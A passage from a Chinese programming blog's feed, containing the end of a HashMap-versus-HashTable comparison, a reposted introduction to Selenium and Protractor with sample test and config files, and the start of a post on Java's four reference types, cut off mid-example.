class="line">&#125;</span><br></pre></td></tr></table></figure><p>正如我们所言，HashMap由于使用了2的幂次方，所以在取模运算时不需要做除法，只需要位的与运算就可以了。但是由于引入的hash冲突加剧问题，HashMap在调用了对象的hashCode方法之后，又做了一些位运算在打散数据。关于这些位计算为什么可以打散数据的问题，本文不再展开了。感兴趣的可以看<a href="https://link.juejin.cn/?target=http://stackoverflow.com/questions/9413966/why-initialcapacity-of-hashtable-is-11-while-the-default-initial-capacity-in-has" title="http://stackoverflow.com/questions/9413966/why-initialcapacity-of-hashtable-is-11-while-the-default-initial-capacity-in-has">这里</a>。</p><p>如果你有细心读代码，还可以发现一点，就是HashMap和HashTable在计算hash时都用到了一个叫hashSeed的变量。这是因为映射到同一个hash桶内的Entry对象，是以链表的形式存在的，而链表的查询效率比较低，所以HashMap/HashTable的效率对哈希冲突非常敏感，所以可以额外开启一个可选hash（hashSeed），从而减少哈希冲突。因为这是两个类相同的一点，所以本文不再展开了，感兴趣的看<a href="https://link.juejin.cn/?target=http://stackoverflow.com/questions/29918624/what-is-the-use-of-holder-class-in-hashmap" title="http://stackoverflow.com/questions/29918624/what-is-the-use-of-holder-class-in-hashmap">这里</a>。事实上，这个优化在JDK 1.8中已经去掉了，因为JDK 1.8中，映射到同一个哈希桶（数组位置）的Entry对象，使用了红黑树来存储，从而大大加速了其查找效率。</p><h4 id="5-线程安全"><a href="#5-线程安全" class="headerlink" title="5. 线程安全"></a>5. 线程安全</h4><p>我们说HashTable是同步的，HashMap不是，也就是说HashTable在多线程使用的情况下，不需要做额外的同步，而HashMap则不行。那么HashTable是怎么做到的呢？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">以下代码及注释来自java.util.HashTable</span><br><span class="line"></span><br><span class="line">public synchronized V get(Object key) &#123;</span><br><span class="line">    Entry tab[] &#x3D; table;</span><br><span class="line">    int hash &#x3D; hash(key);</span><br><span class="line">    int index &#x3D; (hash &amp; 0x7FFFFFFF) % tab.length;</span><br><span class="line">    for (Entry&lt;K,V&gt; e &#x3D; tab[index] ; e !&#x3D; null ; e &#x3D; e.next) &#123;</span><br><span class="line">        if ((e.hash &#x3D;&#x3D; hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            return e.value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public Set&lt;K&gt; keySet() &#123;</span><br><span class="line">    if (keySet &#x3D;&#x3D; null)</span><br><span class="line">        keySet &#x3D; Collections.synchronizedSet(new KeySet(), this);</span><br><span class="line">    return keySet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，也比较简单，就是公开的方法比如get都使用了synchronized描述符。而遍历视图比如keySet都使用了Collections.synchronizedXXX进行了同步包装。</p><h4 id="6-代码风格"><a href="#6-代码风格" class="headerlink" title="6. 代码风格"></a>6. 代码风格</h4><p>从我的品位来看，HashMap的代码要比HashTable整洁很多。下面这段HashTable的代码，我就觉着有点混乱，不太能接受这种代码复用的方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">以下代码及注释来自java.util.HashTable</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * A hashtable enumerator class.  This class implements both the</span><br><span class="line"> * Enumeration and Iterator interfaces, but individual instances</span><br><span class="line"> * can be created with the Iterator methods disabled.  This is necessary</span><br><span class="line"> * to avoid unintentionally increasing the capabilities granted a user</span><br><span class="line"> * by passing an Enumeration.</span><br><span class="line"> *&#x2F;</span><br><span class="line">private class Enumerator&lt;T&gt; implements Enumeration&lt;T&gt;, Iterator&lt;T&gt; &#123;</span><br><span class="line">    Entry[] table &#x3D; Hashtable.this.table;</span><br><span class="line">    int index &#x3D; table.length;</span><br><span class="line">    Entry&lt;K,V&gt; entry &#x3D; null;</span><br><span class="line">    Entry&lt;K,V&gt; lastReturned &#x3D; null;</span><br><span class="line">    int type;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * Indicates whether this Enumerator is serving as an Iterator</span><br><span class="line">     * or an Enumeration.  (true -&gt; Iterator).</span><br><span class="line">     *&#x2F;</span><br><span class="line">    boolean iterator;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * The modCount value that the iterator believes that the backing</span><br><span class="line">     * Hashtable should have.  If this expectation is violated, the iterator</span><br><span class="line">     * has detected concurrent modification.</span><br><span class="line">     *&#x2F;</span><br><span class="line">    protected int expectedModCount &#x3D; modCount;</span><br><span class="line"></span><br><span class="line">    Enumerator(int type, boolean iterator) &#123;</span><br><span class="line">        this.type &#x3D; type;</span><br><span class="line">        this.iterator &#x3D; iterator;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="7-HashTable已经被淘汰了，不要在代码中再使用它。"><a href="#7-HashTable已经被淘汰了，不要在代码中再使用它。" class="headerlink" title="7. HashTable已经被淘汰了，不要在代码中再使用它。"></a>7. HashTable已经被淘汰了，不要在代码中再使用它。</h4><p>以下描述来自于HashTable的类注释：<br><code>If a thread-safe implementation is not needed, it is recommended to use HashMap in place of Hashtable. If a thread-safe highly-concurrent implementation is desired, then it is recommended to use java.util.concurrent.ConcurrentHashMap in place of Hashtable.</code></p><p>简单来说就是，如果你不需要线程安全，那么使用HashMap，如果需要线程安全，那么使用ConcurrentHashMap。HashTable已经被淘汰了，不要在新的代码中再使用它。</p><h4 id="8-持续优化"><a href="#8-持续优化" class="headerlink" title="8. 持续优化"></a>8. 持续优化</h4><p>虽然HashMap和HashTable的公开接口应该不会改变，或者说改变不频繁。但每一版本的JDK，都会对HashMap和HashTable的内部实现做优化，比如上文曾提到的JDK 1.8的红黑树优化。所以，尽可能的使用新版本的JDK吧，除了那些炫酷的新功能，普通的API也会有性能上有提升。<br>为什么HashTable已经淘汰了，还要优化它？因为有老的代码还在使用它，所以优化了它之后，这些老的代码也能获得性能提升。</p><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><ul><li><a href="https://link.juejin.cn/?target=https://github.com/ZhaoX/jdk-1.7-annotated/blob/master/src/java/util/HashMap.java" title="https://github.com/ZhaoX/jdk-1.7-annotated/blob/master/src/java/util/HashMap.java">github.com/ZhaoX/jdk-1…</a></li><li><a href="https://link.juejin.cn/?target=https://github.com/ZhaoX/jdk-1.7-annotated/blob/master/src/java/util/Hashtable.java" title="https://github.com/ZhaoX/jdk-1.7-annotated/blob/master/src/java/util/Hashtable.java">github.com/ZhaoX/jdk-1…</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Selenium和Protractor 简介</title>
      <link href="/2021/07/11/Selenium%E5%92%8CProtractor-%E7%AE%80%E4%BB%8B/"/>
      <url>/2021/07/11/Selenium%E5%92%8CProtractor-%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Selenium"><a href="#1-Selenium" class="headerlink" title="1.Selenium"></a>1.Selenium</h1><p>[转]<a href="https://blog.csdn.net/wanglian2017/article/details/72843984">Selenium框架简介</a><br> Selenium是一系列基于Web的自动化工具，提供一套测试函数，用于支持Web自动化测试。函数非常灵活，能够完成界面元素定位、窗口跳转、结果比较。具有如下特点：<br>   一、多浏览器支持<br>           可以对多浏览器进行测试，如IE、Firefox、Safari、Chrome、Android手机浏览器等。</p><p>   二、支持多种语言<br>          如Java、C#、Python、Ruby、PHP等。</p><p>  三、支持多种操作系统<br>         如Windows、Linux、IOS、Android等。</p><p>  四、开源免费<br>         官网：<a href="http://www.seleniumhg.org/">http://www.seleniumhg.org/</a><br>       Selenium框架由多个工具组成，包括： Selenium IDE，Selenium RC，Selenium WebDriver和SeleniumRC。</p><h3 id="Selenium-IDE"><a href="#Selenium-IDE" class="headerlink" title="Selenium IDE"></a>Selenium IDE</h3><p>该工具是一个用于构建脚本的初级工具，其实是FireFox的一个插件，拥有一个易于使用的界面。它拥有记录功能，能够记录用户执行的操作，并可以导出为可重复使用的脚本。如果没有编程经验，可以通过Selenium IDE来快速熟悉Selenium的命令。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-0259693b22ef6667.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>该工具实际使用不多。</p><h3 id="Selenium-RC"><a href="#Selenium-RC" class="headerlink" title="Selenium RC"></a>Selenium RC</h3><p>   Selenium RC是selenium家族核心部分。Selenium RC支持多种不同的语言编写自动化测试脚本，通过SeleniumRC的服务器作为代理服务器去访问应用，从而达到测试的目的。<br>      SeleniumRC分为ClientLibraries和SeleniumServer。ClientLibraries库主要用于编写测试脚本，用来控制SeleniumServer的库。SeleniumServer负责控制浏览器行为。SeleniumServer包含三部分：Launcher，Http Proxy和Core。其中，Selenium Core是被Selenium Server嵌入到浏览器页面中的，其实SeleniumCore就是一堆JavaScript函数的集合，即通过这些JavaScript函数，我们才可以实现用程序对浏览器进行操作。Launcher用于启动浏览器，把Selenium Core加载到浏览器页面当中，并把浏览器的代理设置为SeleniumServer的HttpProxy。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-a62432216d8fe3ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>Selenium引入了Remote Control Server 这样一个代理 Server，JavaScript 脚本注入和与 Server 通讯都通过这个代理Server 来进行。之所以引入这个代理 Remote Control Server 是因为“同源策略”的限制，通过这个代理服务器来“欺骗”远程Server，达到使其以为是从同一个地方 load 代码以正确返回请求数据的效果。如上图，RC的流程为：</p><ol><li><p>测试用例通过Http请求建立与 selenium-RC server 的连接</p></li><li><p>Selenium RC Server 驱动一个浏览器，把Selenium Core加载入浏览器页面当中，并把浏览器的代理设置为Selenium Server的Http Proxy</p></li><li><p>执行用例向Selenium Server发送Http请求，Selenium Server对请求进行解析，然后通过Http Proxy发送JS命令通知Selenium Core执行操作浏览器的动作并注入 JS 代码</p></li><li><p>Selenium Core执行接受到的指令并操作</p></li><li><p>当浏览器收到新的请求时，发送http请求</p></li><li><p>Selenium Server接收到浏览器发送的Http请求后，自己重组Http请求，获取对应的Web页面</p></li><li><p>Selenium Server中的Http Proxy把接受到的页面返回给浏览器</p></li></ol><h3 id="Selenium-WebDriver"><a href="#Selenium-WebDriver" class="headerlink" title="Selenium WebDriver"></a>Selenium WebDriver</h3><p>Selenium RC使用的是JavaScript注入技术与浏览器打交道，需要Selenium RC启动一个Server，将操作Web元素的API调用转化为一段段Javascript，在Selenium内核启动浏览器之后注入这段Javascript。开发过Web应用的人都知道，Javascript可以获取并调用页面的任何元素，自如的进行操作。由此才实现了Selenium的目的：自动化Web操作。这种Javascript注入技术的缺点是速度不理想，而且稳定性大大依赖于Selenium内核对API翻译成的Javascript质量高低。</p><p>   当Selenium2.x提出了WebDriver的概念之后，它提供了完全另外的一种方式与浏览器交互。那就是利用浏览器原生的API，封装成一套更加面向对象的SeleniumWebDriver API，直接操作浏览器页面里的元素，甚至操作浏览器本身（截屏，窗口大小，启动，关闭，安装插件，配置证书之类的）。由于使用的是浏览器原生的API，速度大大提高，而且调用的稳定性交给了浏览器厂商本身，显然是更加科学。然而带来的一些副作用就是，不同的浏览器厂商，对Web元素的操作和呈现多少会有一些差异，这就直接导致了Selenium WebDriver要分浏览器厂商不同，而提供不同的实现。例如Firefox就有专门的FirefoxDriver，Chrome就有专门的ChromeDriver等等。（甚至包括了AndroidDriver和iOS WebDriver）</p><p>   启动SeleniumRC至今为止还保留着，应该是考虑到向前兼容。</p><p>   Selenium RC要求真实的浏览器环境，而WebFriver可以直接操作HtmlUnit驱动，Selenium启动Firefox非常慢，而WebFriver可以通过HtmlUnit在系统内存中迅速的执行，但是这两者都不方便调试。Webdriver不支持并行测试，而Selenium Grid可以搞定这个。WebFriver要求针对浏览器选择最合适的语言来编写脚本，而众所周知，程序员总是希望使用自己擅长的语言来编写脚本，公司也不可能派多个脚本人员在一个项目中仅仅是为了多浏览器支持。因此，我们需要一款工具，它能够把两者的优点集合起来，这就是我们下面介绍的Selenium 2.0，即Selenium 1.0+Webdriver 。</p><p>Selenium2增加了WebDriver，保持RC向前兼容。WebDriver项目是由Simon Stewart创建的，它是一个非常便捷的自动化测试工具。WebDriver对不同浏览器的处理方式和RC有着明显的不同，RC是不管什么浏览器都是JavaScript来处理，而WebDriver是选择浏览器最容易接受的语言来处理。比如，在IE中，C++最合适，在Firefox中， JavaScript最合适等等。通过灵活选择最合适的语言来处理多浏览器，我们可以很好的回避某些浏览器对JavaScript的安全限制。而且WebDriver不仅仅具有这些能力，它还能够调用操作系统API，尤其是当用户需要模拟鼠标和键盘进行真是的页面操作的时候，这项能力的作用尤为明显。</p><p>  现在支持的WebDriver：AndroidDriver,ChromeDriver, FirefoxDriver,  HtmlUnitDriver, EventFiringWebDriver,InternetExplorerDriver,  IPhoneDriver,  IPhoneSimulatorDriver,  RemoteWebDriver。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-b16531021c5cae59.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>Selenium Grid介绍省略</p><p>Selenium 与工具之间的关系<br><img src="https://upload-images.jianshu.io/upload_images/15531792-fe0d5684dd7893b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="2-Protractor"><a href="#2-Protractor" class="headerlink" title="2.Protractor"></a>2.Protractor</h1><p>[转]<a href="https://blog.csdn.net/wosishui21/article/details/38340527">Protractor小结</a><br>   Protractor是一个Node.js程序，需要安装Node.js才可运行。Protractor默认使用Jasmine测试框架。Protractor是基于WebDriverJS作了封装。</p><h4 id="Selenium-Server"><a href="#Selenium-Server" class="headerlink" title="Selenium Server"></a>Selenium Server</h4><p>SeleniumServer介于测试脚本(用WebDriver API所写)和浏览器Driver(由WebDriver协议控制)之间，充当代理角色。</p><p>Server端转发来自测试脚本的命令给driver，并返回来自driver端的应答给测试脚本。Server端可处理不同语言的测试脚本，也可启动并管理不同版本的多个浏览器。</p><p>示意图如下：</p><p>         [Test Scripts] &lt; ————&gt; [Selenium Server] &lt; ———— &gt; [Browser Drivers]</p><p>  <code>注：当测试Chrome浏览器时，SeleniumServer是可选的，通过配置chromeOnly:true or false来实现。</code></p><h4 id="浏览器支持"><a href="#浏览器支持" class="headerlink" title="浏览器支持"></a>浏览器支持</h4><p>Protractor支持Chrome、FireFox、Safari和IE</p><h4 id="测试框架支持"><a href="#测试框架支持" class="headerlink" title="测试框架支持"></a>测试框架支持</h4><p>Protractor支持三种行为驱动开发(BDD)测试框架：Jasmine、Mocha和Cucumber。这些框架基于JavaScript和Node.js，提供语法、脚手架和报告工具便于你编写和管理你的测试脚本。Protractor默认使用Jasmine框架。</p><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="**工作原理"></a>**工作原理</h2><p>Protractor结合Selenium提供了一个自动化测试基础设施，用以模拟在浏览器或移动设备上运行的Angular应用中的用户交互。<br>当使用Protractor时，注意这几点：</p><ol><li>Protractor基于WebDriverJS作了封装，其中WebDriverJS是Selenium WebDriver API的JavaScript语言实现；</li><li>WebDriver命令是异步的。他们被安排在一个控制流中，返回promises，而非原始值；</li><li>测试脚本发送命令给SeleniumServer，按次序跟浏览器Driver通信。</li></ol><p><img src="https://upload-images.jianshu.io/upload_images/15531792-4f6752bbb3e82970.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>  一个使用SeleniumWebDriver的测试涉及三块：测试脚本、Server端和浏览器，三者之间的通信过程如下图：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-a41e7b7b63de5d45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>SeleniumServer关注来自测试脚本的解释命令，将其转发给一个或多个浏览器。Server端和浏览器之间使用WebDriver Wire Protocol，一种JSON协议。转发命令再被浏览器Driver解释。</p><p>对于Protractor，测试脚本使用Node.js运行。为确保被测的应用已经稳定，Protractor在浏览器响应操作之前会执行一个额外的命令。举例如下：</p><pre><code>     element(by.css(&#39;button.myclass&#39;)).click();</code></pre><p> 这句测试脚本将会产生三个命令，发送给浏览器Driver：</p><ol><li>/session/:sessionId/execute_async：首先，Protractor告诉浏览器将执行一段JavaScript代码。这是个定制的命令，当应用处理完延时和异步请求，可继续执行测试时，该命令用于要求Angular对此作出应答。</li><li>/session/:sessionId/element：然后，发送定位元素的命令</li><li>/session/:sessionId/element/:id/click：最后发送执行点击操作的命令</li></ol><h2 id="特性简介"><a href="#特性简介" class="headerlink" title="**特性简介"></a>**特性简介</h2><h4 id="测试脚本"><a href="#测试脚本" class="headerlink" title="测试脚本"></a>测试脚本</h4><p>Protractor运行需要两个文件，测试脚本文件 (spec file)和配置文件<br>简单的测试文件如下，其中describe函数和it函数是Jasmine框架中的语法，describe定义一个测试案例集，it为单个测试案例。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; spec.js</span><br><span class="line">describe(&#39;angularjs homepage&#39;, function() &#123;</span><br><span class="line">  it(&#39;should add one and two&#39;, function() &#123;</span><br><span class="line">    browser.get(&#39;http:&#x2F;&#x2F;juliemr.github.io&#x2F;protractor-demo&#x2F;&#39;);</span><br><span class="line">    element(by.model(&#39;first&#39;)).sendKeys(1);</span><br><span class="line">    element(by.model(&#39;second&#39;)).sendKeys(2);</span><br><span class="line">    element(by.id(&#39;gobutton&#39;)).click();</span><br><span class="line">    expect(element(by.binding(&#39;latest&#39;)).getText()).</span><br><span class="line">        toEqual(&#39;5&#39;);&#x2F;&#x2F; This is wrong!</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>配置文件如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; conf.js</span><br><span class="line">exports.config &#x3D; &#123;</span><br><span class="line">  seleniumAddress: &#39;http:&#x2F;&#x2F;localhost:4444&#x2F;wd&#x2F;hub&#39;,</span><br><span class="line">  specs: [&#39;spec.js&#39;],</span><br><span class="line">  multiCapabilities: [&#123;</span><br><span class="line">    browserName: &#39;firefox&#39;</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    browserName: &#39;chrome&#39;</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="元素定位"><a href="#元素定位" class="headerlink" title="元素定位"></a>元素定位</h4><p> Protractor提供一个全局函数element，使用一个Locator作为参数，返回一个ElementFinder。通过element.all函数可以操作多个元素。其中，ElementFinder有一组action方法，例如click()，getText()和sendKeys()。在Protractor中，所有的action操作都是异步的。</p><p><strong>Locators</strong><br> 一个定位器(locator)告诉Protractor如何找到一个特定的DOM元素，Protractor通过全局对象by来定位。例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; find an element using a css selector</span><br><span class="line"></span><br><span class="line">by.css(&#39;.myclass&#39;)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; find an element with the given id</span><br><span class="line"></span><br><span class="line">by.id(&#39;myid&#39;)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; find an element with a certain ng-model</span><br><span class="line"></span><br><span class="line">by.model(&#39;name&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; find an element bound to the given variable</span><br><span class="line"></span><br><span class="line">by.binding(&#39;bindingname&#39;)</span><br></pre></td></tr></table></figure><p>locator再作为参数传给element函数，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">element(by.css(&#39;some-css&#39;));</span><br><span class="line">element(by.model(&#39;item.name&#39;));</span><br><span class="line">element(by.binding(&#39;item.name&#39;));</span><br></pre></td></tr></table></figure><p><strong>actions</strong><br> element()函数返回一个ElementFinder对象。ElementFinder对象知道如何使用locator定位DOM元素，但实际还未执行定位。只有等定位元素涉及action方法调用时才会执行。<br><code>注：WebElement上任何在WebDriverJS中可执行的action方法在ElementFinder上也可执行。</code><br>常用的action方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var el &#x3D; element(locator);</span><br><span class="line">&#x2F;&#x2F; Click on the element</span><br><span class="line">el.click();</span><br><span class="line">&#x2F;&#x2F; Send keys to the element (usually an input)</span><br><span class="line">el.sendKeys(&#39;my text&#39;);</span><br><span class="line">&#x2F;&#x2F; Clear the text in an element (usually an input)</span><br><span class="line">el.clear();</span><br><span class="line">&#x2F;&#x2F; Get the value of an attribute, for example, get the value of an input</span><br><span class="line">el.getAttribute(&#39;value&#39;);</span><br></pre></td></tr></table></figure><p> 既然所有的actions是异步的，所有action方法会返回一个promise。所以，如果要获取一个元素的文本并记录，可以这样实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var el &#x3D; element(locator);</span><br><span class="line">el.getText().then(function(text) &#123;</span><br><span class="line">  console.log(text);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>定位多个元素</strong><br>处理多个DOM元素时，使用element.all函数。示例如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Number of elements.</span><br><span class="line">element.all(locator).count();</span><br><span class="line">&#x2F;&#x2F; Get my index (starting at 0).</span><br><span class="line">element.all(locator).get(index);</span><br><span class="line">&#x2F;&#x2F; First and last.</span><br><span class="line">element.all(locator).first();</span><br><span class="line">element.all(locator).last();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> React &amp; JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 强引用，软引用，弱引用，虚引用</title>
      <link href="/2021/07/02/Java-%E5%BC%BA%E5%BC%95%E7%94%A8%EF%BC%8C%E8%BD%AF%E5%BC%95%E7%94%A8%EF%BC%8C%E5%BC%B1%E5%BC%95%E7%94%A8%EF%BC%8C%E8%99%9A%E5%BC%95%E7%94%A8/"/>
      <url>/2021/07/02/Java-%E5%BC%BA%E5%BC%95%E7%94%A8%EF%BC%8C%E8%BD%AF%E5%BC%95%E7%94%A8%EF%BC%8C%E5%BC%B1%E5%BC%95%E7%94%A8%EF%BC%8C%E8%99%9A%E5%BC%95%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>[转自]<a href="https://juejin.cn/post/6844903665241686029">理解Java的强引用、软引用、弱引用和虚引用</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Java执行GC判断对象是否存活有两种方式其中一种是引用计数。</p><p>引用计数：Java堆中每一个对象都有一个引用计数属性，引用每新增1次计数加1，引用每释放1次计数减1。</p><p>在JDK 1.2以前的版本中，若一个对象不被任何变量引用，那么程序就无法再使用这个对象。也就是说，只有对象处于(reachable)可达状态，程序才能使用它。<br>从JDK 1.2版本开始，对象的引用被划分为4种级别，从而使程序能更加灵活地控制对象的生命周期。这4种级别由高到低依次为：强引用、软引用、弱引用和虚引用。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-ef0bcbff139105b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h4 id="1-强引用-StrongReference"><a href="#1-强引用-StrongReference" class="headerlink" title="1. 强引用(StrongReference)"></a>1. 强引用(StrongReference)</h4><p>强引用是使用最普遍的引用。如果一个对象具有强引用，那垃圾回收器绝不会回收它。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object strongReference &#x3D; new Object();</span><br></pre></td></tr></table></figure><p>当内存空间不足时，Java虚拟机宁愿抛出OutOfMemoryError错误，使程序异常终止，也不会靠随意回收具有强引用的对象来解决内存不足的问题。<br>如果强引用对象不使用时，需要弱化从而使GC能够回收，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strongReference &#x3D; null;</span><br></pre></td></tr></table></figure><p>显式地设置strongReference对象为null，或让其超出对象的生命周期范围，则gc认为该对象不存在引用，这时就可以回收这个对象。具体什么时候收集这要取决于GC算法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public void test() &#123;</span><br><span class="line">    Object strongReference &#x3D; new Object();</span><br><span class="line">    &#x2F;&#x2F; 省略其他操作</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在一个方法的内部有一个强引用，这个引用保存在Java栈中，而真正的引用内容(Object)保存在Java堆中。<br>当这个方法运行完成后，就会退出方法栈，则引用对象的引用数为0，这个对象会被回收。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-8abcd35b85a4c0a1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>在ArrayList类中定义了一个elementData数组，在调用clear方法清空数组时，每个数组元素被赋值为null。<br>不同于elementData=null，强引用仍然存在，避免在后续调用add()等方法添加元素时进行内存的重新分配。<br>使用如clear()方法内存数组中存放的引用类型进行内存释放特别适用，这样就可以及时释放内存。</p><h4 id="2-软引用-SoftReference"><a href="#2-软引用-SoftReference" class="headerlink" title="2. 软引用(SoftReference)"></a>2. 软引用(SoftReference)</h4><p>如果一个对象只具有软引用，则内存空间充足时，垃圾回收器就不会回收它；如果内存空间不足了，就会回收这些对象的内存。只要垃圾回收器没有回收它，该对象就可以被程序使用。</p><p><code>软引用可用来实现内存敏感的高速缓存。</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 强引用</span><br><span class="line">String strongReference &#x3D; new String(&quot;abc&quot;);</span><br><span class="line">&#x2F;&#x2F; 软引用</span><br><span class="line">String str &#x3D; new String(&quot;abc&quot;);</span><br><span class="line">SoftReference&lt;String&gt; softReference &#x3D; new SoftReference&lt;String&gt;(str);</span><br></pre></td></tr></table></figure><p>软引用可以和一个引用队列(ReferenceQueue)联合使用。如果软引用所引用对象被垃圾回收，JAVA虚拟机就会把这个软引用加入到与之关联的引用队列中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ReferenceQueue&lt;String&gt; referenceQueue &#x3D; new 